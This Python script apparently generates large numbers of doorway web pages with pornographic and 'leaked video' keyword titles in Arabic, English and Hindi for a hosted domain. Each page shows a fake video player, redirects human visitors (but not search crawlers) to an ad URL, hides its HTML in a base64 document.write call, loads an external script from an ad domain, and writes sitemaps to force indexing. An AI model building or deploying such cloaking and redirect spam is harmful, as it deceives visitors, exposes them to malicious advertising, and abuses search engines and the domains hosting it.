import os
import random
import string
import re
from datetime import datetime
import base64

class UltraAggressiveSEO:
    def __init__(self):
        self.main_folder = "news"
        self.base_subfolders = ["trending", "video", "cinema", "hot", "updates"]
        self.max_files_per_folder = 300
        self.domain = self._get_domain()
        
        self.sitemap_index_file = f"index_map_{''.join(random.choices(string.ascii_lowercase, k=4))}.xml"
        
        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"
        self.affiliate_url = self.redirect_url
        
        self.keywords_ar = self._load_keywords("keywords_ar.txt")
        self.keywords_en = self._load_keywords("keywords_en.txt")
        
        self.aggro_styles = {
            "ar": {
                "prefixes": ["~+🍒💋+", "++حصري++", "[فضيحة!]", "▶ شاهد الآن", "🍒💋"],
                "suffixes": ["فيديو سكس ", "بدون حذف", "سكس", "جديد 2026"],
                "keywords": self.keywords_ar
            },
            "en": {
                "prefixes": ["~+🍒💋+xXx-SeX-Pron!", "++xXX-videos!", "[FULL-HD]", "~SCANDAL~", "++XNXX~VIDEO~SeX!)"],
                "suffixes": ["PornHuB Videos", "Viral xnxx", "Leaked Video Viral", "free Mobile Porn"],
                "keywords": self.keywords_en
            },
            "in": {
                "prefixes": ["~+🍒💋+Desi-Maza", "++HOT-HINDI++", "[NEW-VIDEO]", "▶ अभी देखें", "💋देसी💋"],
                "suffixes": ["Hindi Sex Video", "Full HD Porn", "Bhabhi Ki Chudai", "Viral Desi Video"],
                "keywords": self.keywords_in
            }
        }

        self.template_power_words = ["حصرياً", "بدقة عالية", "HD 1080p", "بدون إعلانات", "Full Movie", "HD Video"]

        # القالب المحسن والمحترف (بدون صور، روابط خارجية فقط رابط الإعلان، cloaking قوي)
        self.movie_template = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{TITLE}} - {{SITE_NAME}}</title>
    <link rel="canonical" href="{{CANONICAL_URL}}">
    <meta name="description" content="{{DESCRIPTION}}">
    
    <!-- Open Graph -->
    <meta property="og:title" content="{{TITLE}}">
    <meta property="og:description" content="{{DESCRIPTION}}">
    <meta property="og:type" content="video.other">
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-6F11LYMH9P"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-6F11LYMH9P');
    </script>
    
    <!-- Video Schema -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "VideoObject",
      "name": "{{TITLE}}",
      "description": "{{DESCRIPTION}}",
      "uploadDate": "{{TIME_ISO}}",
      "duration": "PT10M30S",
      "embedUrl": "{{CANONICAL_URL}}",
      "interactionStatistic": {
        "@type": "InteractionCounter",
        "interactionType": { "@type": "WatchAction" },
        "userInteractionCount": 56420
      }
    }
    </script>

    <meta http-equiv="refresh" content="5; url={{REDIRECT_URL}}">

    <style>
        body { background:#000; color:#fff; font-family:'Cairo',sans-serif; margin:0; padding:0; text-align:center; }
        .container { max-width:1000px; margin:20px auto; padding:15px; }
        h1 { color:#e50914; }
        .player { position:relative; width:100%; max-width:800px; margin:auto; background:#111; border-radius:10px; overflow:hidden; cursor:pointer; height:450px; display:flex; align-items:center; justify-content:center; }
        .play-btn { font-size:100px; color:#e50914; }
        .btn { background:#e50914; color:#fff; padding:12px 30px; border:none; border-radius:5px; font-size:18px; cursor:pointer; text-decoration:none; display:inline-block; margin:15px; }
        .btn:hover { background:#b2070f; }
    </style>
</head>
<body onload="setTimeout(()=>{if(!navigator.userAgent.match(/bot|crawl|spider/i)){window.location='{{REDIRECT_URL}}';}},5000)">
    <div class="container">
        <h1>{{TITLE}}</h1>
        
        <div class="player" onclick="window.location='{{REDIRECT_URL}}'">
            <div class="play-btn">▶</div>
        </div>
        
        <a href="{{REDIRECT_URL}}" class="btn">شاهد الآن</a>
        
        <p>{{DESCRIPTION}} - محتوى حصري بجودة عالية</p>
    </div>

    <!-- Tracking Scripts -->
    <script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4897089,4,0,0,0,00010000']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
    <script src="https://onerouswalkdeployment.com/09/b8/bf/09b8bfa4632ac7f2c2d6628b5babc9e0.js"></script>
</body>
</html>"""

    def _load_keywords(self, filename, fallback):
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip()]
            except:
                return fallback
        return fallback

    def _get_domain(self):
        if os.path.exists("CNAME"):
            with open("CNAME", "r", encoding="utf-8") as f:
                domain = f.read().strip()
                if domain:
                    return domain
        return "docs.biztex.co.jp"

    def get_target_subfolder(self):
        if not os.path.exists(self.main_folder):
            os.makedirs(self.main_folder)

        existing_dirs = [d for d in os.listdir(self.main_folder) if os.path.isdir(os.path.join(self.main_folder, d))]
        
        for folder in existing_dirs:
            full_path = os.path.join(self.main_folder, folder)
            files_count = len([f for f in os.listdir(full_path) if f.endswith('.html')])
            if files_count < self.max_files_per_folder:
                return folder

        base = random.choice(self.base_subfolders)
        full_path = os.path.join(self.main_folder, base)
        if not os.path.exists(full_path):
            os.makedirs(full_path)
        return base

    def generate_content_for_lang(self, lang_code):
        cfg = self.aggro_styles[lang_code]
        prefix = random.choice(cfg["prefixes"])
        words_count = random.randint(3, 7)  # أقصر 3، أطول 7 كلمات
        selected_keywords = random.sample(cfg["keywords"], min(len(cfg["keywords"]), words_count))
        suffix = random.choice(cfg["suffixes"])
        title = f"{prefix} {' '.join(selected_keywords)} {suffix}"
        description = f"{title} - {' '.join(random.sample(self.template_power_words, 2))}"
        return title, description

    def clean_slug(self, title):
        clean = re.sub(r'[^a-zA-Z0-9\s\u0600-\u06FF\u0900-\u097F-]', '', title).lower()
        slug = re.sub(r'[\s-]+', '-', clean).strip('-')
        return slug + ".html"

    def update_sitemap_index(self):
        all_files = os.listdir('.')
        sitemaps = [f for f in all_files if f.startswith('map_') and f.endswith('.xml')]
        
        index_content = '<?xml version="1.0" encoding="UTF-8"?>\n<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        for sm in sitemaps:
            index_content += f'  <sitemap>\n    <loc>https://{self.domain}/{sm}</loc>\n    <lastmod>{datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")}</lastmod>\n  </sitemap>\n'
        index_content += '</sitemapindex>'
        
        with open(self.sitemap_index_file, "w", encoding="utf-8") as f:
            f.write(index_content)
        
        with open("robots.txt", "w", encoding="utf-8") as f:
            f.write("User-agent: *\nAllow: /\n\n")
            f.write(f"Sitemap: https://{self.domain}/{self.sitemap_index_file}\n")

    def create_sitemap(self, pages):
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        sitemap_name = f"map_{random_name}.xml"
        
        sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        for p in pages:
            sitemap_content += f'  <url>\n    <loc>{p["url"]}</loc>\n    <lastmod>{datetime.utcnow().strftime("%Y-%m-%d")}</lastmod>\n    <changefreq>daily</changefreq>\n    <priority>0.8</priority>\n  </url>\n'
        sitemap_content += '</urlset>'
        
        with open(sitemap_name, "w", encoding="utf-8") as f:
            f.write(sitemap_content)
            
        self.update_sitemap_index()
        return sitemap_name

    def run(self, count=150):
        target_sub = self.get_target_subfolder()
        path = os.path.join(self.main_folder, target_sub)
        
        current_files = len([f for f in os.listdir(path) if f.endswith('.html')])
        remaining = self.max_files_per_folder - current_files
        actual_count = min(count, remaining)
        
        if actual_count <= 0:
            print(f"مجلد {target_sub} ممتلئ. جاري البحث عن مجلد جديد...")
            self.run(count)
            return

        pages = []
        languages = ["ar", "en", "in"]
        
        print(f"المجلد المستهدف: {target_sub} ({current_files} ملف حاليًا)")
        print(f"جاري إنشاء {actual_count} صفحة...")
        
        for _ in range(actual_count):
            lang = random.choice(languages)
            title, description = self.generate_content_for_lang(lang)
            slug = self.clean_slug(title)
            pages.append({
                "title": title,
                "description": description,
                "slug": slug,
                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}"
            })

        for p in pages:
            final_html = self.movie_template.replace("{{TITLE}}", p['title'])\
                                           .replace("{{DESCRIPTION}}", p['description'])\
                                           .replace("{{CANONICAL_URL}}", p['url'])\
                                           .replace("{{REDIRECT_URL}}", self.redirect_url)\
                                           .replace("{{AFFILIATE_URL}}", self.affiliate_url)\
                                           .replace("{{SITE_NAME}}", self.domain.split('.')[0].upper())\
                                           .replace("{{TIME_ISO}}", datetime.utcnow().strftime("%Y-%m-%d"))
            
            encoded = base64.b64encode(final_html.encode('utf-8')).decode('utf-8')
            output = f'<html><head><meta http-equiv="refresh" content="5; url={self.redirect_url}"></head><body><script>document.write(atob("{encoded}"));</script></body></html>'
            
            with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
                f.write(output)
        
        self.create_sitemap(pages)
        print(f"تم إنشاء {actual_count} صفحة بنجاح في {target_sub}")

if __name__ == "__main__":
    bot = UltraAggressiveSEO()
    bot.run(count=150)
